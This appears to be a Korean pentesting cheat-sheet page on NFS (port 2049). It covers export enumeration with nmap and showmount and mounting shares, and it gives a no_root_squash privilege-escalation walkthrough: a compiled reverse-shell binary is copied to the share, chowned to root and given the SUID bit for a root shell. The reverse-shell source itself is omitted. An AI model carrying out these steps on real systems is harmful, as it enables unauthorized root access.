---
layout: page
title: NFS_(2049)
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

# NFS (2049) 가이드

NFS(Network File System)는 원격 시스템의 디렉터리를 로컬 시스템에 마운트하여, 마치 로컬 파일처럼 사용할 수 있게 해주는 프로토콜입니다. 설정이 미흡할 경우, 심각한 보안 취약점으로 이어질 수 있습니다.

---

### **1. NFS Enumeration**

- **목표:** NFS 서버가 어떤 디렉터리를 외부에 공유하고 있는지 확인합니다.

```bash
nmap -sV --script=nfs-showmount $target -v

# -e, --exports: 서버의 공유 목록(export list)을 보여줌
showmount -e $target
```

- **결과 분석:** 출력된 공유 디렉터리 경로와 함께, 접근이 허용된 IP 주소나 대역(`*`는 모두 허용)을 확인합니다.

---

### **2. 공유 디렉터리 마운트 (Mounting the Share)**

- **목표:** 확인된 공유 디렉터리를 로컬 머신에 연결하여 내부 파일을 탐색합니다.

#### **단계별 절차:**

1.  **로컬 마운트 지점 생성:**
```bash
mkdir /mnt/nfs_share
```

2.  **원격 공유 마운트:**
```bash
# -t nfs: 파일 시스템 타입을 NFS로 지정
# -o nolock: 파일 잠금을 사용하지 않아 구형 NFS 서버와의 호환성 문제를 줄여줌
mount -t nfs $target:/path/to/share /mnt/nfs_share -o nolock
```

3.  **탐색 및 정리:**
```bash
# 마운트된 디렉터리로 이동하여 파일 시스템 탐색
cd /mnt/nfs_share
ls -la

# 작업 완료 후 반드시 마운트 해제
umount /mnt/nfs_share
```

---

### **3. 주요 공격 벡터: `no_root_squash`**

- **개념:** `no_root_squash`는 NFS 공유의 가장 위험한 설정 중 하나입니다. 기본적으로 NFS는 클라이언트의 `root` 사용자가 공유 폴더에 접근하면, 권한이 없는 `nobody` 사용자로 강등시킵니다(이를 `root_squash`라 함). 하지만 `no_root_squash` 옵션이 설정되어 있으면, **클라이언트의 `root`가 서버에서도 `root` 권한을 그대로 유지**하게 됩니다.

- **공격 시나리오:**

  1.  `no_root_squash`로 설정된 공유를 로컬 `root` 권한으로 마운트합니다.
  2.  공격자 머신에서 C 코드로 리버스 셸 페이로드를 작성하고 컴파일합니다.
      ```bash(title="공격자: 리버스 셸 작성 및 컴파일")
      # revshell.c 작성
      # ...
      gcc revshell.c -o revshell
      ```
  3.  컴파일된 리버스 셸 파일을 마운트된 디렉터리로 복사합니다.
      ```bash
      sudo cp revshell /mnt/nfs_share/
      ```
  4.  마운트된 디렉터리 내에서 해당 파일의 소유자를 `root`로 변경하고, **SUID 비트를 설정**합니다.
      ```bash
      sudo chown root:root /mnt/nfs_share/revshell
      sudo chmod 4755 /mnt/nfs_share/revshell
      ```
  5.  이제 타겟 시스템의 일반 사용자가 해당 공유 폴더에 접근하여 `revshell` 파일을 실행하면, **파일 소유자인 `root`의 권한으로 Reverse Shell이 실행**되어 공격자에게 `root` Shell이 연결됩니다.


